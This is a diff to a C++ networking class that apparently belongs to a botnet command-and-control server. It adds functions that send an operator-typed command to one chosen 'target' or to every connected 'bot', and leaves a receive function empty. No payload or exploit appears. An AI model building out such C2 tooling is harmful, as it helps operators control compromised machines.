@@ -85,6 +85,46 @@ void		Network::NewConnection(void)
 }
 
 /*
+** Managing command/control behavior of multiple clients.
+*/
+
+/*
+** Multiple targets.
+*/ 
+
+void		Network::ManageClientResponse(std::string command, std::vector<std::string> target_list)
+{
+	size_t			i;
+
+	for (std::string const &ip : target_list)
+	{
+		i = send(this->address_port[ip], command.c_str(), command.size(), 0);
+		if (i == 0)
+			std::cout << "Target " << ip << " failed to send :: check your connection " << std::endl;
+		else
+			std::cout << "Message to " << ip << " sent" << std::endl;
+	}
+}
+
+/*
+** Same command to all clients. 
+*/
+
+void		Network::ManageClientResponse(std::string command)
+{
+	size_t			i;
+
+	for (auto const &[key, val] : this->address_port)
+	{
+		i = send(val, command.c_str(), command.size(), 0);
+		if (i == 0)
+			std::cout << "Bot isn't listening... " << std::endl;
+		else
+			std::cout << "Send successful " << std::endl;
+	}		
+}
+
+/*
 ** Number 4 is used to test if the damn connects to remote clients
 ** and is only for testing.
 */
@@ -92,12 +132,15 @@ void		Network::NewConnection(void)
 void		Network::SendBuffer(void)
 {
 	std::string		input;
-	char			*send_buffer;
 
 	std::cout << "SERVER > " << std::endl;
 	getline(std::cin, input);
-	send_buffer = strdup(input.c_str());
-	size_t i = send(4, send_buffer, input.size(), 0);
+	ManageClientResponse(input);
+}
+
+void		Network::RecvBuffer(void)
+{
+
 }
 
 /*
@@ -118,6 +161,8 @@ void		Network::CommandLoop(void)
 				NewConnection();
 			else if (FD_ISSET(0, &this->botlist))
 				SendBuffer();
+			else
+				RecvBuffer();
 			return ;
 		}
 	}
